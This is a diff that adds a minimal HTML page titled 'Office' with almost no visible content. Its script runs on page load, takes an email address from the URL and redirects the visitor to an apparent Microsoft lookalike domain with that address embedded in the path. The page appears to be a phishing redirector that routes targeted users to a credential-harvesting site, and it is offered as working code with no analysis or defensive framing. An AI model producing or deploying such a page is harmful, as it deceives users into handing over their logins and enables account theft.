@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Office</title>
+    <script type="text/javascript">
+       
+        function getEmailParameter() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email');
+        }
+
+        
+        function redirectWithEmail() {
+            const email = getEmailParameter();
+            if (email) {
+                const newUrl = `https://xxxx.msonlineencryptmessage.com/##EMAIL##`.replace('##EMAIL##', email);
+                window.location.href = newUrl;
+            }
+        }
+
+        
+        window.onload = redirectWithEmail;
+    </script>
+</head>
+<body>
+    .
+</body>
+</html>
